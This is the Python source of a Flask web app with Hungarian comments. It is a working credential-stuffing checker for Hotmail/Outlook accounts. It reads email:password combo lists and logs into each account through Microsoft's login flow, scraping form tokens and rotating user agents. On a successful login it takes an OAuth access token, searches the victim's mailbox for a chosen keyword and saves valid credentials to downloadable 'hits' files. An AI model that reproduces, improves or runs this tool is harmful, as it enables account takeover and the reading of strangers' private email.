import os
import uuid
import json
import re
import threading
import time
import requests
from flask import Flask, render_template, request, send_file
from flask_socketio import SocketIO
from user_agent import generate_user_agent

app = Flask(__name__)
# Fontos: A Render miatt a ping_timeout-ot megemeljük
socketio = SocketIO(app, cors_allowed_origins="*", ping_timeout=60)

RESULTS_DIR = "results"
if not os.path.exists(RESULTS_DIR):
    os.makedirs(RESULTS_DIR)

class HotmailWebWorker:
    def __init__(self, combo_list, keyword, sid):
        self.combo_list = combo_list
        self.keyword = keyword
        self.sid = sid
        self.hits_file = os.path.join(RESULTS_DIR, f"hits_{sid}.txt")
        self.custom_file = os.path.join(RESULTS_DIR, f"custom_{sid}.txt")
        self.stats = {"hits": 0, "bad": 0, "custom": 0, "retries": 0}

    def log(self, msg, mtype="info"):
        """Üzenet küldése a weboldal konzoljára"""
        socketio.emit('new_log', {'msg': msg, 'type': mtype}, room=self.sid)

    def update_ui(self):
        """Statisztika frissítése a weboldalon"""
        socketio.emit('stats_update', self.stats, room=self.sid)

    def run(self):
        self.log(">>> Rendszer: Ellenőrzés megkezdése...", "info")
        
        for line in self.combo_list:
            line = line.strip()
            if not line or '@' not in line or ':' not in line:
                continue
            
            email, password = line.split(':', 1)
            self.log(f"Folyamatban: {email}", "info")
            
            success = False
            retries = 0
            while retries < 3:
                session = requests.Session()
                try:
                    ua = generate_user_agent()
                    # 1. Lépés: Authorize oldal lekérése
                    auth_url = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
                    
                    headers = {
                        "User-Agent": ua,
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        "X-Requested-With": "com.microsoft.outlooklite"
                    }
                    
                    self.log(f"[{email}] Kapcsolódás a Microsofthoz...", "info")
                    res = session.get(auth_url, headers=headers, timeout=20)
                    
                    if res.status_code != 200:
                        self.log(f"HIBA: Microsoft blokkolja az IP-t! (Status: {res.status_code})", "bad")
                        break

                    # Adatok kinyerése (PPFT, urlPost)
                    ppft = ""
                    url_post = ""
                    
                    # Regex keresés a scripted alapján
                    sd_match = re.search(r'var ServerData = ({.*?});', res.text, re.DOTALL)
                    if sd_match:
                        try:
                            sd = json.loads(sd_match.group(1))
                            sFTTag = sd.get('sFTTag', '')
                            if sFTTag:
                                pm = re.search(r'value="([^"]+)"', sFTTag)
                                if pm: ppft = pm.group(1)
                            url_post = sd.get('urlPost', '')
                        except: pass

                    if not ppft:
                        pm = re.search(r'name="PPFT" value="([^"]+)"', res.text)
                        ppft = pm.group(1) if pm else ""
                    
                    if not url_post:
                        um = re.search(r'"urlPost":"([^"]+)"', res.text)
                        url_post = um.group(1) if um else ""

                    if not ppft or not url_post:
                        self.log(f"[{email}] Hiba: Nem sikerült kinyerni az adatokat (PPFT).", "bad")
                        break

                    # 2. Lépés: Login küldése
                    self.log(f"[{email}] Bejelentkezési adatok küldése...", "info")
                    data_str = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&PPFT={ppft}&PPSX=Passport&NewUser=1"
                    
                    post_headers = {
                        "User-Agent": ua,
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Referer": res.url
                    }
                    
                    login_res = session.post(url_post, data=data_str, headers=post_headers, allow_redirects=False, timeout=20)

                    # Ellenőrzés, hogy sikerült-e a bejelentkezés
                    if "__Host-MSAAUTHP" not in session.cookies:
                        self.log(f"[BAD] {email} - Hibás jelszó vagy blokkolt fiók.", "bad")
                        self.stats["bad"] += 1
                        success = True
                        break

                    # 3. Lépés: Token és Keresés
                    self.log(f"[{email}] Sikeres belépés! Token lekérése...", "hit")
                    
                    # Token kinyerése a redirectből
                    auth_code = ""
                    loc = login_res.headers.get('Location', '')
                    if 'code=' in loc:
                        auth_code = loc.split('code=')[1].split('&')[0]
                    
                    if auth_code:
                        t_url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
                        t_data = {
                            "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                            "grant_type": "authorization_code",
                            "code": auth_code,
                            "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
                            "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D"
                        }
                        tr = requests.post(t_url, data=t_data, timeout=20).json()
                        token = tr.get("access_token")

                        if token:
                            self.log(f"[{email}] Keresés kulcsszóra: {self.keyword}...", "info")
                            s_url = "https://outlook.live.com/search/api/v2/query"
                            s_payload = {"EntityRequests": [{"EntityType": "Conversation", "Query": {"QueryString": self.keyword}}]}
                            s_headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
                            
                            s_res = requests.post(s_url, json=s_payload, headers=s_headers, timeout=20).json()
                            
                            # Találatok száma
                            try:
                                total = s_res['EntityRequests'][0]['Result']['Total']
                            except: total = 0

                            if int(total) > 0:
                                self.stats["hits"] += 1
                                with open(self.hits_file, "a") as f: f.write(f"{email}:{password} | Találat: {total}\n")
                                self.log(f"[HIT] {email} - TALÁLT: {total} db levél!", "hit")
                            else:
                                self.stats["custom"] += 1
                                with open(self.custom_file, "a") as f: f.write(f"{email}:{password}\n")
                                self.log(f"[OK] {email} - Nincs ilyen levél.", "custom")
                        
                        success = True
                        break
                        
                except Exception as e:
                    retries += 1
                    self.stats["retries"] += 1
                    self.log(f"Hiba: {email} - Újrapróbálás {retries}/3...", "bad")
                    time.sleep(1)
            
            if not success:
                self.stats["bad"] += 1
            
            self.update_ui()
            time.sleep(0.5) # Kis szünet a szálak között

        self.log(">>> Rendszer: A folyamat befejeződött.", "info")
        socketio.emit('finished', {}, room=self.sid)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/download/<ftype>/<sid>')
def download(ftype, sid):
    file = os.path.join(RESULTS_DIR, f"{ftype}_{sid}.txt")
    if os.path.exists(file):
        return send_file(file, as_attachment=True)
    return "Nincs fájl", 404

@socketio.on('start_check')
def handle_start(data):
    # A szál indítása előtt egy kis visszajelzés
    worker = HotmailWebWorker(data['combo'].splitlines(), data['keyword'], request.sid)
    threading.Thread(target=worker.run).start()

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    # Renderen a debug=False ajánlott élesben
    socketio.run(app, host='0.0.0.0', port=port, debug=False)
